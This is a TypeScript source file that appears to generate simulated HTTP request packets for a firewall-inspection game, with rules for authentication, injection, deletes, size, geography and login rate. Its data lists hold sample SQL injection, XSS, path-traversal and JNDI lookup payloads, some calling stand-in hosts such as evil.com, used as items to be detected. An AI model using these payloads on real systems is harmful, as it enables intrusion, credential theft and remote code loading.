import { PACKET_TIMEOUT, VALID_RATIO } from './config'
import { evaluate, GEO_POOL } from './rules'
import type { AuthKind, Packet, Phase, PayloadKind, Rule } from './types'

const pick = <T,>(a: readonly T[]): T => a[Math.floor(Math.random() * a.length)]
const rand = (min: number, max: number) => min + Math.random() * (max - min)
const hex = (n: number) =>
  Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)]).join('')

interface Endpoint { method: string; path: string }
const SAFE_ENDPOINTS: Endpoint[] = [
  { method: 'GET', path: '/api/v1/users/42' },
  { method: 'POST', path: '/api/v1/orders' },
  { method: 'GET', path: '/v2/catalog' },
  { method: 'PUT', path: '/api/v1/profile' },
  { method: 'POST', path: '/api/v1/auth' },
  { method: 'GET', path: '/v2/invoices' },
  { method: 'GET', path: '/api/v1/status' },
  { method: 'POST', path: '/v2/upload' },
  { method: 'GET', path: '/v2/users/export' },
  { method: 'PATCH', path: '/api/v1/settings' },
]
const DELETE_ENDPOINTS: Endpoint[] = [
  { method: 'DELETE', path: '/api/v1/cart/17' },
  { method: 'DELETE', path: '/admin/db' },
  { method: 'DELETE', path: '/v2/users/42' },
]
const LOGIN: Endpoint = { method: 'POST', path: '/api/v1/login' }

const CLEAN_PAYLOADS = [
  '{"user_id": 42}',
  '{"item":"sku-8841","qty":2}',
  '{"page":3,"limit":20}',
  '{"email":"ana@example.com"}',
  '{"theme":"dark"}',
  '{"order_id":"A-1042"}',
  '{"query":"cloud storage"}',
  '{"region":"eu01"}',
  '{"name":"O\'Brien"}',
]
const SQLI = [
  "' OR 1=1 --",
  "admin' --",
  '1; DROP TABLE users',
  '{"id":"1 UNION SELECT pass FROM users"}',
  `{"user":"' OR '1'='1"}`,
]
const XSS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  `{"name":"<script>fetch('//evil')</script>"}`,
  '<svg onload=alert(document.cookie)>',
]
const PATH = ['../../../etc/passwd', '{"file":"..%2F..%2Fetc%2Fshadow"}', '{"path":"../../.env"}']
const JNDI = ['${jndi:ldap://evil.com/a}', '{"ua":"${jndi:ldap://185.220.9.7/x}"}', 'jndi:ldap://evil.com/exploit']

const SAFE_GEOS: Record<string, string[]> = {
  US: ['34.192.0.12', '52.14.201.9', '18.205.33.7'],
  DE: ['18.195.44.3', '3.120.88.14', '85.214.12.50'],
  FR: ['51.158.7.22', '15.236.5.9'],
  NL: ['52.58.121.6', '31.13.64.35'],
  GB: ['35.176.19.2', '18.130.4.77'],
  ES: ['34.250.18.4', '85.91.23.10'],
  INTERNAL: ['10.0.4.15', '10.0.7.88', '10.2.1.4', '192.168.4.20'],
}
const RISKY_GEOS: Record<string, string[]> = {
  RU: ['185.220.101.4', '91.219.236.18', '95.213.255.9'],
  CN: ['118.26.40.2', '223.71.4.31'],
  KP: ['175.45.176.8'],
  IR: ['5.160.12.9', '37.32.17.3'],
}

let nextId = 1

function mkGeo(geo: string): { geo: string; ip: string } {
  const pool = SAFE_GEOS[geo] ?? RISKY_GEOS[geo] ?? SAFE_GEOS.US
  return { geo, ip: pick(pool) }
}

function authLabel(auth: AuthKind): string {
  switch (auth) {
    case 'VALID':
      return `Bearer eyJ…${hex(3)} (VALID)`
    case 'EXPIRED':
      return `Bearer eyJ…${hex(3)} (EXPIRED)`
    case 'NONE':
      return 'None (Anonymous)'
    case 'LEAKED':
      return 'API_KEY_LEAKED'
  }
}

function build(over: Partial<Packet> & { ep?: Endpoint; geoCode?: string }): Packet {
  const ep = over.ep ?? pick(SAFE_ENDPOINTS)
  const g = mkGeo(over.geoCode ?? pick(Object.keys(SAFE_GEOS)))
  const auth: AuthKind = over.auth ?? 'VALID'
  return {
    id: nextId++,
    method: ep.method,
    path: ep.path,
    ip: g.ip,
    geo: g.geo,
    auth,
    authLabel: authLabel(auth),
    sizeKB: over.sizeKB ?? +rand(0.3, 4.8).toFixed(1),
    payload: over.payload ?? pick(CLEAN_PAYLOADS),
    payloadKind: over.payloadKind ?? 'clean',
    violation: null,
    decoy: over.decoy ?? false,
    activatedAt: 0,
    timeoutMs: 0,
  }
}

/** A random "looks-legit" base packet with a sprinkle of scary-but-fine traits. */
function randomCleanBase(): Packet {
  const r = Math.random()
  const over: Partial<Packet> & { ep?: Endpoint; geoCode?: string } = {}
  if (r < 0.1) over.ep = pick(DELETE_ENDPOINTS)
  else if (r < 0.22) over.ep = LOGIN
  if (Math.random() < 0.12) over.geoCode = pick(Object.keys(RISKY_GEOS))
  const s = Math.random()
  if (s < 0.1) over.sizeKB = Math.round(rand(1500, 4900))
  else if (s < 0.4) over.sizeKB = Math.round(rand(20, 900))
  return build(over)
}

function fmtKB(kb: number): number {
  return +kb.toFixed(1)
}

function mutate(base: Packet, kind: string, rules: Rule[]): Packet {
  const p = { ...base }
  switch (kind) {
    case 'AUTH': {
      p.auth = pick<AuthKind>(['NONE', 'EXPIRED', 'LEAKED'])
      p.authLabel = authLabel(p.auth)
      break
    }
    case 'SQLI':
      p.payloadKind = 'sqli'
      p.payload = pick(SQLI)
      break
    case 'XSS':
      p.payloadKind = 'xss'
      p.payload = pick(XSS)
      break
    case 'PATH':
      p.payloadKind = 'path'
      p.payload = pick(PATH)
      break
    case 'JNDI':
      p.payloadKind = 'jndi'
      p.payload = pick(JNDI)
      break
    case 'DELETE': {
      const ep = pick(DELETE_ENDPOINTS)
      p.method = ep.method
      p.path = ep.path
      break
    }
    case 'SIZE':
      p.sizeKB = fmtKB(rand(5.5, 24) * 1024)
      break
    case 'GEO': {
      const rule = rules.find((r) => r.id === 'GEO')
      const g = mkGeo(rule?.geo ?? 'RU')
      p.geo = g.geo
      p.ip = g.ip
      break
    }
    case 'RATE': {
      p.method = LOGIN.method
      p.path = LOGIN.path
      if (p.geo === 'INTERNAL') {
        const g = mkGeo(pick(['US', 'DE', 'FR', 'NL']))
        p.geo = g.geo
        p.ip = g.ip
      }
      break
    }
  }
  return p
}

function cleanFor(rules: Rule[]): Packet {
  for (let i = 0; i < 40; i++) {
    const p = randomCleanBase()
    if (!evaluate(p, rules)) return p
  }
  return build({ ep: SAFE_ENDPOINTS[0], geoCode: 'DE', sizeKB: 1.2 })
}

function invalidKinds(rules: Rule[]): string[] {
  const kinds: string[] = ['PATH', 'JNDI']
  for (const r of rules) {
    if (r.id === 'AUTH') kinds.push('AUTH', 'AUTH')
    if (r.id === 'INJECTION') kinds.push('SQLI', 'SQLI', 'XSS')
    if (r.id === 'NO_DELETE') kinds.push('DELETE', 'DELETE')
    if (r.id === 'MAX_SIZE') kinds.push('SIZE', 'SIZE')
    if (r.id === 'GEO') kinds.push('GEO', 'GEO')
    if (r.id === 'RATE_LOGIN') kinds.push('RATE', 'RATE')
  }
  return kinds
}

/** Subtle violations that otherwise look perfectly green. */
function decoyKinds(rules: Rule[]): string[] {
  const ids = new Set(rules.map((r) => r.id))
  const k: string[] = ['AUTH']
  if (ids.has('NO_DELETE')) k.push('DELETE')
  if (ids.has('MAX_SIZE')) k.push('SIZE')
  if (ids.has('GEO')) k.push('GEO')
  if (ids.has('RATE_LOGIN')) k.push('RATE', 'RATE')
  return k
}

export function generatePacket(rules: Rule[], phase: Phase): Packet {
  let p: Packet
  if (Math.random() < VALID_RATIO) {
    p = cleanFor(rules)
  } else {
    const useDecoy = phase === 3 && Math.random() < 0.4
    for (let i = 0; ; i++) {
      const base = cleanFor(rules)
      if (useDecoy) {
        // spotless-looking packet with exactly one subtle flaw
        base.decoy = true
        base.sizeKB = Math.min(base.sizeKB, 800)
        base.payload = CLEAN_PAYLOADS[0]
        base.payloadKind = 'clean'
        p = mutate(base, pick(decoyKinds(rules)), rules)
        if (p.auth === 'LEAKED' || p.auth === 'NONE') {
          p.auth = 'EXPIRED'
          p.authLabel = authLabel('EXPIRED')
        }
        if (p.path === '/api/v1/login' && p.geo === 'INTERNAL') p.geo = 'DE'
        if (p.sizeKB > 5 * 1024) p.sizeKB = fmtKB(rand(5.1, 5.9) * 1024)
      } else {
        p = mutate(base, pick(invalidKinds(rules)), rules)
      }
      if (evaluate(p, rules) || i > 20) break
    }
  }
  p.violation = evaluate(p, rules)
  p.timeoutMs = PACKET_TIMEOUT[phase]
  return p
}

export function fmtSize(kb: number): string {
  if (kb >= 1024) return `${(kb / 1024).toFixed(1)} MB`
  if (kb >= 100) return `${Math.round(kb)} KB`
  return `${kb.toFixed(1)} KB`
}

export const ALL_GEOS = GEO_POOL
export type { PayloadKind }
